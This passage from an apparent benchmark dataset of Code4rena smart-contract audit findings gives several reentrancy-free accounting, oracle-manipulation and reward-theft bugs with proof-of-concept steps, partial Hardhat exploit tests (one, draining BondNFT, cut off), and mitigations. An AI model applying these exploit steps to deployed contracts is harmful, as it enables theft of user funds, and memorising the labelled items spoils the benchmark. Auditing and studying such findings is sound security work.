(Joyn) confirmed and commented:\",\n      \"This is a high-risk issue and we intend to solve it. The mitigation provided looks good too and will be considered when fixing this issue üëç\",\n      \"deluca-mike (judge) commented:\",\n      \"See a detailed exploit and recommended solution at #21\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 175,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 12,\n    \"bug_description\": \" \\\"CoreCollection can be reinitialized\\\"\",\n    \"line\": \"CoreCollection[46,87]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-joyn#h-04-corecollection-can-be-reinitialized\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hyh, also found by 0xkatana, hubble, kirk-baird, leastwood, pedroais, rayn, rfa, Ruhum, saian, securerodd, and WatchPug\",\n      \"Reinitialization is possible for CoreCollection asinitializefunction setsinitializedflag, but doesn‚Äôt control for it, so the function can be rerun multiple times.\",\n      \"Such types of issues tend to be critical as all core variables can be reset this way, for examplepayableToken, which provides a way to retrieve all the contract funds.\",\n      \"However, setting priority to be medium asinitializeisonlyOwner. A run by an external attacker this way is prohibited, but the possibility of owner initiated reset either by mistake or with a malicious intent remains with the same range of system breaking consequences.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"initializedoesn‚Äôt control for repetitive runs:\",\n      \"https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L87\"\n    ],\n    \"recommended_mitigation\": [\n      \"AddonlyUnInitializedmodifier to theinitializefunction:\",\n      \"https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L46-L49\",\n      \"sofianeOuafir (Joyn) confirmed, disagreed with severity and commented:\",\n      \"This is a high severity issue and we intend to fix it. The mitigation step looks great and will be considered to fix the issue.In my opinion, the severity level should be 3 (High Risk) instead of 2 (Med Risk)\",\n      \"deluca-mike (judge) increased severity to High and commented:\",\n      \"Not convinced this is a high severity issue, since erroneously changingpayableTokenvia a re-initialization can simply be corrected by a re-re-initialization to set it back correctly. Further, as the warden mentioned, the initialize function is behindonlyOwner.However, if it can be shown that users other than the owner can end up losing value due to the owner abusing or erroneously usinginitialize, then it can be promoted to High Severity.And just as I say that, #17 points that out clearly. So, yes, agreed, this is a High Severity issue.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 177,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-2\",\n    \"difficulty\": 11,\n    \"bug_description\": \" \\\"StakedCitadel doesnÈà•Ê™õ use correct balance for internal accounting\\\"\",\n    \"line\": \"StakedCitadel[291,772,881,887,890]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-badger-citadel#h-01-stakedcitadel-doesnt-use-correct-balance-for-internal-accounting\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by Ruhum, also found by cccz, wuwe1, VAD37, TrungOre, shenwilly, minhquanym, kyliek, danb, gs8nrv, and rayn\",\n      \"https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L291-L295\",\n      \"https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L772-L776\",\n      \"https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L881-L893\",\n      \"The StakedCitadel contract‚Äôsbalance()function is supposed to return the balance of the vault + the balance of the strategy. But, it only returns the balance of the vault. The balance is used to determine the number of shares that should be minted when depositing funds into the vault and the number of shares that should be burned when withdrawing funds from it.\",\n      \"Since most of the funds will be located in the strategy, the vault‚Äôs balance will be very low. Some of the issues that arise from this:\",\n      \"You can‚Äôt deposit to a vault that already minted shares but has no balance of the underlying token:\",\n      \"fresh vault with 0 funds and 0 shares\",\n      \"Alice deposits 10 tokens. She receives 10 shares back (https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L887-L888)\",\n      \"Vault‚Äôs tokens are deposited into the strategy (nowbalance == 0andtotalSupply == 10)\",\n      \"Bob tries to deposit but the transaction fails because the contract tries to divide by zero:https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L890(pool == balance())\",\n      \"You get more shares than you should\",\n      \"fresh vault with 0 funds and 0 shares\",\n      \"Alice deposits 10 tokens. She receives 10 shares back (https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L887-L888)\",\n      \"Vault‚Äôs tokens are deposited into the strategy (nowbalance == 0andtotalSupply == 10)\",\n      \"Bob now first transfers 1 token to the vault so that the balance is now1instead of0.\",\n      \"Bob deposits 5 tokens. He receives5 * 10 / 1 == 50shares:https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L890\",\n      \"Now, the vault received 15 tokens. 10 from Alice and 5 from Bob. But Alice only has 10 shares while Bob has 50. Thus, Bob can withdraw more tokens than he should be able to.\",\n      \"It simply breaks the whole accounting of the vault.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The comment says that it should be vault‚Äôs + strategy‚Äôs balance:https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L291-L295\",\n      \"Here‚Äôs another vault from the badger team where the function is implemented correctly:https://github.com/Badger-Finance/badger-vaults-1.5/blob/main/contracts/Vault.sol#L262\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add the strategy‚Äôs balance to the return value of thebalance()function likehere.\",\n      \"GalloDaSballo (BadgerDAO) confirmed and commented:\",\n      \"Agree balance must have been changed by mistake or perhaps earn should not transfer to a strategy either would work\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 178,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"User can steal all rewards due to checkpoint after transfer\\\"\",\n    \"line\": \"StakerVault[112]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-backd#h-01-user-can-steal-all-rewards-due-to-checkpoint-after-transfer\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xDjango, also found by unforgiven\",\n      \"StakerVault.sol#L112-L119\",\n      \"I believe this to be a high severity vulnerability that is potentially included in the currently deployedStakerVault.solcontract also. The team will be contacted immediately following the submission of this report.\",\n      \"InStakerVault.sol, the user checkpoints occur AFTER the balances are updated in thetransfer()function. The user checkpoints update the amount of rewards claimable by the user. Since their rewards will be updated after transfer, a user can send funds between their own accounts and repeatedly claim maximum rewards since the pool‚Äôs inception.\",\n      \"In every actionable function excepttransfer()ofStakerVault.sol, a call toILpGauge(lpGauge).userCheckpoint()is correctly made BEFORE the action effects.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Assume a certain period of time has passed since the pool‚Äôs inception. For easy accounting, assumepoolStakedIntegralofLpGauge.solequals1. ThepoolStakedIntegralis used to keep track of the current reward rate.\",\n      \"Steps:\",\n      \"Account A stakes 1000 LP tokens.balances[A] += 1000In the samestakeFor()function,userCheckpoint()was already called so A will already haveperUserShare[A]set correctly based on their previously 0 balance and the currentpoolStakedIntegral.Account A can immediately send all balance to Account B viatransfer().Since the checkpoint occurs after the transfer, B‚Äôs balance will increase and thenperUserShare[B]will be updated. The calculation forperUserSharelooks as follows.\",\n      \"perUserShare\\n[\\nuser\\n] += (\\n(\\nstakerVault\\n.\\nstakedAndActionLockedBalanceOf\\n(\\nuser\\n)).\\nscaledMul\\n(\\n(\\npoolStakedIntegral_\\n-\\nperUserStakedIntegral\\n[\\nuser\\n])\\n)\\n);\",\n      \"Assuming Account B is new to the protocol, theirperUserStakedIntegral[user]will default to0.\",\n      \"perUserShare[B] += 1000 * (1 - 0) = 1000\",\n      \"B is able to callclaimRewards()and mint all 1000 reward tokens.B then callstransfer()and sends all 1000 staked tokens to Account C.Same calculation occurs, and C can claim all 1000 reward tokens.This process can be repeated until the contract is drained of reward tokens.\"\n    ],\n    \"recommended_mitigation\": [\n      \"InStakerVault.transfer(), move the call toILpGauge(lpGauge).userCheckpoint()to before the balances are updated.\",\n      \"chase-manning (Backd) confirmed and resolved\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 179,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"function lockFunds in TopUpActionLibrary can cause serious fund lose. fee and Capped bypass. ItÈà•Ê™ö not calling stakerVault.increaseActionLockedBalance when transfers stakes.\\\"\",\n    \"line\": \"TopUpAction[57]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-backd#h-02-function-lockfunds-in-topupactionlibrary-can-cause-serious-fund-lose-fee-and-capped-bypass-its-not-calling-stakervaultincreaseactionlockedbalance-when-transfers-stakes\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by unforgiven\",\n      \"TopUpAction.sol#L57-L65\",\n      \"In function TopUpActionLibrary.lockFunds when transfers stakes from payer it doesn‚Äôt call stakerVault.increaseActionLockedBalance for that payer so stakerVault.actionLockedBalances[payer] is not get updated for payer and stakerVault.stakedAndActionLockedBalanceOf(payer) is going to show wrong value and any calculation based on this function is gonna be wrong which will cause fund lose and theft and some restriction bypasses.\",\n      \"VIM\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"When user wants to create a TopUpAction. so he deposit his funds to Pool and get LP token. then stake the LP token in StakerVault and use that stakes to create a TopUp position with function TopUpAction.register. This function transfer user stakes (locks user staks) and create his position.\",\n      \"For transferring and locking user stakes it uses TopUpActionLibrary.lockFunds. function lockFunds transfers user stakes but don‚Äôt call stakerVault.increaseActionLockedBalance for the payer which cause that stakerVault.actionLockedBalances[payer] to get different values(not equal to position.depositTokenBalance).\",\n      \"Function StakerVault.stakedAndActionLockedBalanceOf(account) uses stakerVault.actionLockedBalances[account] so it will return wrong value and any where in code that uses stakedAndActionLockedBalanceOf() is going to cause problems.\",\n      \"three part of the codes uses stakerVault.stakedAndActionLockedBalanceOf():\",\n      \"LiqudityPool.depositFor() for checking user total deposits to be less than depositCap.LiqudityPool._updateUserFeesOnDeposit() for updating user fee on new deposits.userCheckpoint() for calculating user rewards.attacker can use #1 and #2 to bypass high fee payment and max depositCap and #3 will cause users to lose\\nrewards.\",\n      \"The detail steps:1- user deposit fund to Pool and get LP token.2- user stakes LP token in StakerVault.3- user approve TopUpAction address to transfer his staks in StakerVault.3- user use all his stakes to create a position with TopUpAction.register() function.3.1- register() will call lockFunds to transfer and lock user stakes.3.2- lockFunds() will transfer user stakes with stakerVault.transferFrom() but don‚Äôt call stakerVault.increaseActionLockedBalance() so StakerVault.actionLockedBalances[user] will be zero.3.3- StakerVault.balance[useer] will be zero too because his stakes get transfers in 3.24- StakerVault.stakedAndActionLockedBalanceOf(user) will return zero (user has some locked stakes in TopUpAction but because of the bug calculation get out of sync)\",\n      \"In this moment user will lose all the rewards that are minted in LpGauge. because userCheckpoint() use stakerVault.stakedAndActionLockedBalanceOf(user) for calculating rewards which is zero  and new rewards will be zero too.\",\n      \"Attacker can use this process to bypass ‚Äúmax deposit Cap‚Äù and deposit any amount of assets he wants. because LiqudityPool.depositFor(address,uint256,uint256) uses stakedAndActionLockedBalanceOf to check user deposits which is zero so Attacker can deposit & stake & register to make his balance zero and repeat this and in the end reset his TopUp positions to get back his large stakes which are multiple time bigger than ‚Äúmax deposit Cap‚Äù\",\n      \"Attacker can also use this process to bypass fee penalties for early withdraw. because LiqudityPool._updateUserFeesOnDeposit() to get user current balance use stakedAndActionLockedBalanceOf() which is zero. so the value of shareExisting variable become zero and newFeeRatio will be calculated based on feeOnDeposit which can be minFee if asset is already in wallet for some time.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add this line to TopUpActionLibrary.lockFunds() after stakerVault.transferFrom():\",\n      \"stakerVault.increaseActionLockedBalance(payer, amountLeft);\",\n      \"chase-manning (Backd) confirmed and resolved\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 180,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 9,\n    \"bug_description\": \" \\\"Critical Oracle Manipulation Risk by Lender\\\"\",\n    \"line\": \"NFTPairWithOracle[200,286]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-abranft#h-03-critical-oracle-manipulation-risk-by-lender\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0x1337, also found by catchup, cccz, kenzo, GimelSec, BowTiedWardens, gzeon, horsefacts, and hyh\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211\",\n      \"The intended use of the Oracle is to protect the lender from a drop in the borrower‚Äôs collateral value. If the collateral value goes up significantly and higher than borrowed amount + interest, the lender should not be able to seize the collateral at the expense of the borrower. However, in theNFTPairWithOraclecontract, the lender could change the Oracle once a loan is outstanding, and therefore seize the collateral at the expense of the borrower, if the actual value of the collateral has increased significantly. This is a critical risk because borrowers asset could be lost to malicious lenders.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"InNFTPairWithOracle, theparamsare set by theborrowerwhen they callrequestLoan(), including the Oracle used. Once a lender agrees with the parameters and calls thelend()function, theloan.statuschanges toLOAN_OUTSTANDING.\",\n      \"Then, the lender can call theupdateLoanParams()function and pass in its ownparamsincluding the Oracle used. Therequirestatement from line 205 to 211 does not check ifparams.oracleandcur.oracleare the same. A malicious lender could pass in his ownoracleafter the loan becomes outstanding, and the change would be reflected in line 221.\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211\",\n      \"In a situation where the actual value of the collateral has gone up by a lot, exceeding the amount the lender is owed (principal + interest), the lender would have an incentive to seize the collateral. If the Oracle is not tampered with, lender should not be able to do this, because line 288 should fail. But a lender could freely change Oracle once the loan is outstanding, then a tampered Oracle could produce a very lowratein line 287 such that line 288 would pass, allowing the lender to seize the collateral, hurting the borrower.\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288\"\n    ],\n    \"recommended_mitigation\": [\n      \"Once a loan is agreed to, the oracle used should not change. I‚Äôd recommend adding a check in therequirestatement in line 205 - 211 thatparams.oracle == cur.oracle\",\n      \"cryptolyndon (AbraNFT) confirmed and commented:\",\n      \"Confirmed, this is bad. First report of this particular exploit.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 181,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S5-2\",\n    \"difficulty\": 7,\n    \"bug_description\": \" \\\"Lender is able to seize the collateral by changing the loan parameters\\\"\",\n    \"line\": \"NFTPairWithOracle[198,200,288]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-abranft#h-04-lender-is-able-to-seize-the-collateral-by-changing-the-loan-parameters\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by Ruhum, also found by IllIllI, WatchPug, BowTiedWardens, gzeon, plotchy, and scaraven\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L198-L223\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L200-L212\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288\",\n      \"The lender should only be able to seize the collateral if:\",\n      \"the borrower didn‚Äôt repay in time\",\n      \"the collateral loses too much of its value\",\n      \"But, the lender is able to seize the collateral at any time by modifying the loan parameters.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"TheupdateLoanParams()allows the lender to modify the parameters of an active loan in favor of the borrower. But, by setting theltvBPSvalue to0they are able to seize the collateral.\",\n      \"IfltvBPSis0the following require statement inremoveCollateral()will always be true:\",\n      \"https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288\",\n      \"rate * 0 / BPS < amountis alwaystrue.\",\n      \"That allows the lender to seize the collateral although its value didn‚Äôt decrease nor did the time to repay the loan come.\",\n      \"So the required steps are:\",\n      \"lend the funds to the borrowercallupdateLoanParams()to set theltvBPSvalue to0callremoveCollateral()to steal the collateral from the contract\"\n    ],\n    \"recommended_mitigation\": [\n      \"Don‚Äôt allowupdateLoanParams()to change theltvBPSvalue.\",\n      \"cryptolyndon (AbraNFT) confirmed and commented:\",\n      \"Confirmed, and the first to report this particular exploit.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 182,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Mistake while checking LTV to lender accepted LTV\\\"\",\n    \"line\": \"NFTPairWithOracle[316]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-abranft#h-05-mistake-while-checking-ltv-to-lender-accepted-ltv\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by catchup, also found by WatchPug, gzeon, and hyh\",\n      \"It comments in the\\\\_lend()function that lender accepted conditions must be at least as good as the borrower is asking for.\\nThe line which checks the accepted LTV (lender‚Äôs LTV) against borrower asking LTV is:params.ltvBPS >= accepted.ltvBPS,\\nThis means lender should be offering a lower LTV, which must be the opposite way around.\\nI think this may have the potential to strand the lender, if he enters a lower LTV.\\nFor example borrower asking LTV is 86%. However, lender enters his accepted LTV as 80%.\\nlend() will execute with 86% LTV and punish the lender, whereas it should revert and acknowledge the lender that his bid is not good enough.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"The condition should be changed as: params.ltvBPS <= accepted.ltvBPS\"\n    ]\n  },\n  {\n    \"row_number\": 183,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"User can forfeit other user rewards\\\"\",\n    \"line\": \"ExtraRewardsDistributor[127]\",\n    \"url\": \" https://code4rena.com/reports/2022-05-aura#h-01-user-can-forfeit-other-user-rewards\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by csanuragjain\",\n      \"ExtraRewardsDistributor.sol#L127\",\n      \"User can forfeit other user rewards by giving a higher _startIndex in getReward function.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"This is a valid report, however, considering it is only related to the distribution of reward tokens, I have a hard time classifying this as high risk.\",\n      \"I agree with the high risk rating on this one. A third party could cause significant loss of expected reward funds for users across the entire protocol if so inclined.\"\n    ],\n    \"proof_of_concept\": [\n      \"Assume User B has not received any reward yet so that his userClaims[_token][User B]=0 \",\n      \"User A calls getReward function with _account as User B and _startIndex as 5\",\n      \"This eventually calls _allClaimableRewards at ExtraRewardsDistributor.sol#L213 which computes epochIndex =5>0?5:0 = 5\",\n      \"Assuming tokenEpochs is 10 and latestEpoch is 8, so reward will computed from epoch 5 till epoch index 7 and _allClaimableRewards will return index as 7\",\n      \"_getReward will simply update userClaims[_token][User B] with 7\",\n      \"This is incorrect because as per contract User B has received reward from epoch 0-7 even though he only received reward for epoch 5-7\"\n    ],\n    \"recommended_mitigation\": [\n      \"Do not allow users to call getReward function for other users.\"\n    ]\n  },\n  {\n    \"row_number\": 186,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 10,\n    \"bug_description\": \" \\\"Lock.sol: assets deposited with Lock.extendLock function are lost\\\"\",\n    \"line\": \"Lock[10,61,84,98]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-tigris#h-01-locksol-assets-deposited-with-lockextendlock-function-are-lost\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byHollaDieWaldfee, also found bysha256yan,kaliberpoziomka8552,0xsomeone,cccz,0xbepresent,ali_shehab,Ruhum,rvierdiiev, andcsanuragjain\",\n      \"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10\",\n      \"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76\",\n      \"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92\",\n      \"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105\",\n      \"TheLockcontract (https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10) allows end-users to interact with bonds.\",\n      \"There are two functions that allow to lock some amount of assets. The first function isLock.lock(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76) which creates a new bond. The second function isLock.extendLock(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92). This function extends the lock for some_periodand / or increases the locked amount by some_amount.\",\n      \"The issue is that theLock.extendLockfunction does not increase the value intotalLocked[_asset]. This however is necessary becausetotalLocked[_asset]is reduced whenLock.release(https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105) is called.\",\n      \"Therefore only the amount of assets deposited viaLock.lockcan be released again. The amount of assets deposited usingLock.extendLockcan never be released again because reducingtotalLocked[_asset]will cause a revert due to underflow.\",\n      \"So the amount of assets deposited usingLock.extendLockis lost.\",\n      \"VS Code\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"User A callsLock.lockto lock a certain_amount(amount1) of_assetfor a certain_period.User A calls thenLock.extendLockand increases the locked amount of the bond by some amount2User A waits until the bond has expiredUser A callsLock.release. This function calculatestotalLocked[asset] -= lockAmount;. Which will cause a revert because the value oftotalLocked[asset]is only amount1\",\n      \"You can add the following test to theBondstest inBonds.js:\",\n      \"describe\\n(\\n\\\"ReleaseUnderflow\\\"\\n,\\nfunction\\n() {\\nit\\n(\\n\\\"release can cause underflow\\\"\\n,\\nasync\\nfunction\\n() {\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nowner\\n).\\nmintFor\\n(\\nuser\\n.\\naddress\\n,\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\n\\\"110\\\"\\n));\\n// Lock 100 for 9 days\\nawait\\nlock\\n.\\nconnect\\n(\\nuser\\n).\\nlock\\n(\\nStableToken\\n.\\naddress\\n,\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\n\\\"100\\\"\\n),\\n9\\n);\\nawait\\nbond\\n.\\nconnect\\n(\\nowner\\n).\\nsetManager\\n(\\nlock\\n.\\naddress\\n);\\nawait\\nstabletoken\\n.\\nconnect\\n(\\nuser\\n).\\napprove\\n(\\nlock\\n.\\naddress\\n,\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\n\\\"10\\\"\\n));\\n// Lock another 10\\nawait\\nlock\\n.\\nconnect\\n(\\nuser\\n).\\nextendLock\\n(\\n1\\n,\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\n\\\"10\\\"\\n),\\n0\\n);\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_increaseTime\\\"\\n, [\\n864000\\n]);\\n// Skip 10 days\\nawait\\nnetwork\\n.\\nprovider\\n.\\nsend\\n(\\n\\\"evm_mine\\\"\\n);\\n// Try to release 110 after bond has expired -> Underflow\\nawait\\nlock\\n.\\nconnect\\n(\\nuser\\n).\\nrelease\\n(\\n1\\n);\\n});\\n});\",\n      \"Run it withnpx hardhat test --grep \\\"release can cause underflow\\\".You can see that it fails because it causes an underflow.\"\n    ],\n    \"recommended_mitigation\": [\n      \"AddtotalLocked[_asset] += amountto theLock.extendLockfunction.\",\n      \"TriHaz (Tigris Trade) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has shown an issue with accounting that will cause principal deposits added viaextendLockto be lost, for this reason I agree with High Severity.\",\n      \"GainsGoblin (Tigris Trade) resolved:\",\n      \"Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419172200\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 187,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 6,\n    \"bug_description\": \" \\\"Malicious user can steal all assets in BondNFT\\\"\",\n    \"line\": \"BondNFT[168]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-tigris#h-05-malicious-user-can-steal-all-assets-in-bondnft\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byhihen, also found byhansfriese,unforgiven,__141345__,rvierdiiev, andHollaDieWaldfee\",\n      \"Malicious user can drain all assets in BondNFT, and other users will lose their rewards.\",\n      \"VS Code\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"When callingBondNFT.claim()for an expired bond, it will recalculateaccRewardsPerShare. This is because the reward after theexpireEpochdoes not belong to that expired bond and needs to be redistributed to all other bonds.\",\n      \"if\\n(\\nbond\\n.\\nexpired\\n) {\\nuint\\n_pendingDelta\\n= (\\nbond\\n.\\nshares\\n*\\naccRewardsPerShare\\n[\\nbond\\n.\\nasset\\n][\\nepoch\\n[\\nbond\\n.\\nasset\\n]] /\\n1e18\\n-\\nbondPaid\\n[\\n_id\\n][\\nbond\\n.\\nasset\\n]) - (\\nbond\\n.\\nshares\\n*\\naccRewardsPerShare\\n[\\nbond\\n.\\nasset\\n][\\nbond\\n.\\nexpireEpoch\\n-\\n1\\n] /\\n1e18\\n-\\nbondPaid\\n[\\n_id\\n][\\nbond\\n.\\nasset\\n]);\\nif\\n(\\ntotalShares\\n[\\nbond\\n.\\nasset\\n] >\\n0\\n) {\\naccRewardsPerShare\\n[\\nbond\\n.\\nasset\\n][\\nepoch\\n[\\nbond\\n.\\nasset\\n]] +=\\n_pendingDelta\\n*\\n1e18\\n/\\ntotalShares\\n[\\nbond\\n.\\nasset\\n];\\n}\\n}\",\n      \"In the current implementation ofBondNFT.claim(), it can be called repeatedly as long as the expired bond is not released.\",\n      \"According to the formula in the above code, we can find that although each subsequentclaim()of the expired bond will transfer 0 reward, theaccRewardsPerSharewill be updated cumulatively.\\nThus, the pending rewards of all other users will increase every time the expired bond isclaim()ed.\",\n      \"A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:\",\n      \"Create two bonds (B1, B2) with differentexpireEpochAt some time after B1 has expired (B2 has not), keep callingLock.claim(B1)to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.CallLock.claim(B2)to claim all pending rewards of B2.\",\n      \"An example of such an attack:\",\n      \"diff\\n--\\ngit\\na\\n/\\ntest\\n/09.\\nBonds\\n.\\njs\\nb\\n/\\ntest\\n/09.\\nBonds\\n.\\njs\\nindex\\n16\\nc3ff5\\n..7\\nc445c3\\n100644\\n---\\na\\n/\\ntest\\n/09.\\nBonds\\n.\\njs\\n+++\\nb\\n/\\ntest\\n/09.\\nBonds\\n.\\njs\\n@@ -\\n245\\n,\\n7\\n+\\n245\\n,\\n90\\n@@\\ndescribe\\n(\\n\\\"Bonds\\\"\\n,\\nfunction\\n() {\\nawait\\nlock\\n.\\nconnect\\n(\\nuser\\n).\\nrelease\\n(\\n2\\n);\\nexpect\\n(\\nawait\\nbond\\n.\\npending\\n(\\n1\\n)).\\nto\\n.\\nbe\\n.\\nequals\\n(\\n\\\"999999999999999999725\\\"\\n);\\n// Negligable difference from 1000e18 due to solidity division\\n});\\n+\\n+\\nit\\n.\\nonly\\n(\\n\\\"Drain BondNFT rewards\\\"\\n,\\nasync\\nfunction\\n() {\\n+\\nconst\\ngetState\\n=\\nasync\\n()\\n=>\\n{\\n+\\nconst\\nbalHacker\\n=\\nawait\\nstabletoken\\n.\\nbalanceOf\\n(\\nhacker\\n.\\naddress\\n);\\n+\\nconst\\nbalLock\\n=\\nawait\\nstabletoken\\n.\\nbalanceOf\\n(\\nlock\\n.\\naddress\\n);\\n+\\nconst\\nbalBond\\n=\\nawait\\nstabletoken\\n.\\nbalanceOf\\n(\\nbond\\n.\\naddress\\n);\\n+\\nconst\\n[\\npending1\\n,\\npending2\\n,\\npending3\\n] = [\\nawait\\nbond\\n.\\npending\\n(\\n1\\n),\\nawait\\nbond\\n.\\npending\\n(\\n2\\n),\\nawait\\nbond\\n.\\npending\\n(\\n3\\n)];\\n+\\nreturn\\n{\\nhacker:\\nbalHacker\\n,\\nlock:\\nbalLock\\n,\\nbond:\\nbalBond\\n,\\npending1\\n,\\npending2\\n,\\npending3\\n};\\n+      };\\n+\\nconst\\nparseEther\\n= (\\nv\\n)\\n=>\\nethers\\n.\\nutils\\n.\\nparseEther\\n(\\nv\\n.\\ntoString\\n());\\n+\\nconst\\ngwei\\n=\\nparseEther\\n(\\n1\\n).\\ndiv\\n(\\n1e9\\n);\\n+\\n+\\n// prepare 